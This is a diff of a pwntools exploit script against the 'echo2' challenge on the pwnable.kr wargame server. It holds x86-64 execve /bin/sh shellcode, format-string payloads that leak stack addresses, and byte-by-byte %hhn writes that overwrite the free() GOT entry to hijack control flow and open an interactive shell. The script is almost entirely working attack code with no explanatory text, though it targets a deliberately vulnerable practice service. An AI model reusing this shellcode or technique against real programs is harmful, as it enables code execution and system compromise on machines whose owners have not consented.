@@ -4,25 +4,30 @@ from pwn import *
 remoto = False
 remoto = True
 if remoto:
-	host = '0'
 	host = 'pwnable.kr'
+	host = '0'
 	conn = connect(host, 9011)
 else:
 	conn = process('./echo2')
 
 nombre = 'physics'
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+# https://www.exploit-db.com/exploits/42179
+shellcode = 'A' + 'B' * 22 + 'C'
+shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+nombre = shellcode
+free_GOT = 0x602000
 obj_o = 0x602098
-shellcode = 'A' + 'B' * 29 + 'C'
 
-assert len(shellcode) < 32
+assert len(shellcode) <= 24
 
 def read_addr(address, text=False):
 	conn.sendline('2')
-	conn.recvuntil(nombre + '\n')
+	conn.recvuntil('\n')
 	payload  = '%7$s    '
 	payload += p64(address)
 	conn.sendline( payload )
+	#print conn.recvuntil('\n')
+	#print conn.recvuntil('\n')
 	addr = conn.recvuntil('    ')[:-4]
 	if text is False:
 		addr += '\x00' * (8 - len(addr))
@@ -36,90 +41,74 @@ def main():
 	conn.sendline(nombre)
 	conn.recvuntil('> ')
 
-	# get ret addr
+
+	# get shellcode addr
 	conn.sendline('2')
-	conn.recvuntil(nombre + '\n')
-	conn.sendline('%9$p')
+	conn.recvuntil('\n')
+	conn.sendline('%10$p')
 	line = conn.recvline()
 	leak = int(line[2:], 16)
 	print 'stack leak:' + hex(leak)
-	ret_addr = leak - 216
-	print 'main ret addr:' + hex(ret_addr)
-	print ''
-	conn.recvuntil('> ')
-
-	# get shellcode addr
-	leak = read_addr(obj_o)
-	print 'heap leak:' + hex(leak)
-	shellcode_addr = leak + 0x34
-	if remoto and host == 'pwnable.kr':
-		shellcode_addr += 12
-	if len(hex(shellcode_addr)) > 8:
-		pass
-		#print 'try again'
-		#conn.close()
-		#return
+	shellcode_addr = leak - 32
 	print 'shellcode addr:' + hex(shellcode_addr)
 	print ''
+	conn.recvuntil('> ')
+	#print read_addr(shellcode_addr, text=True)
+	#for i in range(0x100):
+	#	print str(i)
+	#	try:
+	#		print hex(leak-(i*8))
+	#		print read_addr(leak-(i*8), text=True)
+	#	except:
+	#		pass
 
-	# overwrite ret addr
+	# wipe free got adddr
 	conn.sendline('2')
-	conn.recvuntil(nombre + '\n')
-	payload  = '%7$n    '
-	payload += p64(ret_addr)
+	conn.recvuntil('\n')
+	payload  = '%7$lln  '
+	payload += p64(free_GOT)
 	conn.sendline( payload )
-	print conn.recvuntil('goodbye')[:7]
 	conn.recvuntil('> ')
 
-	adr = read_addr(ret_addr)
-	print hex(adr)
+	# overwrite free got adddr
+	sh_bytes = hex(shellcode_addr)[2:]
+	b1 = (5, int(sh_bytes[0:2],   16))
+	b2 = (4, int(sh_bytes[2:4],   16))
+	b3 = (3, int(sh_bytes[4:6],   16))
+	b4 = (2, int(sh_bytes[6:8],   16))
+	b5 = (1, int(sh_bytes[8:10],  16))
+	b6 = (0, int(sh_bytes[10:12], 16))
+	sh_bytes = [b1, b2, b3, b4, b5, b6]
 
-	# debug
-	#addr = read_addr(ret_addr)
-	#print hex(addr)
-	#conn.close()
-	#return
-	# debug
+	for sh_byte in sh_bytes:
+		pos, lenght = sh_byte
+		if lenght < 8:
+			print 'try again'
+			conn.close()
+			return
+		else:
+			conn.sendline('2')
+			conn.recvuntil(nombre)
+			print 'escribo:' + hex(lenght)
+			extra = len(str(lenght))
+			payload  = '%{:d}x'.format(lenght - (8 - extra))
+			payload += ' ' * (8 - extra)
+			payload += '%8$hhn'
+			payload += p64(free_GOT +  pos)
+			conn.sendline( payload )
+			conn.recvuntil('> ')
 
-	#sh_bytes = hex(shellcode_addr)[2:]
-	#b1 = (2, int(sh_bytes[0:2], 16))
-	#b2 = (1, int(sh_bytes[2:4], 16))
-	#b3 = (0, int(sh_bytes[4:6], 16))
-	#sh_bytes = [b1, b2, b3]
-
-	#for sh_byte in sh_bytes:
-	#	pos, lenght = sh_byte
-	#	if lenght < 8:
-	#		print 'try again'
-	#		conn.close()
-	#		return
-	#	else:
-	#		conn.sendline('2')
-	#		conn.recvuntil(nombre)
-	#		print 'escribo:' + hex(lenght)
-	#		extra = len(str(lenght))
-	#		payload  = '%{:d}x'.format(lenght - (8 - extra))
-	#		payload += ' ' * (8 - extra)
-	#		payload += '%8$hhn'
-	#		payload += p64(ret_addr +  pos)
-	#		conn.sendline( payload )
-	#		conn.recvuntil('> ')
-
-	# place shellcode on heap
-	conn.sendline('3')
-	conn.recvuntil(nombre + '\n')
-	conn.sendline(shellcode)
-	conn.recvuntil('> ')
+	print 'new free addr:' + hex(read_addr(free_GOT))
+	#print 'shellcode:' + read_addr(shellcode_addr, text=True)
 
 	# trigger shellcode
 	conn.sendline('4')
-	conn.sendline('y')
-	conn.recvuntil('bye')
-	#conn.interactive()
+	conn.interactive()
 	conn.close()
 
 if __name__ == '__main__':
+	main()
 	try:
-		main()
+		pass#main()
 	except KeyboardInterrupt as e:
 		pass
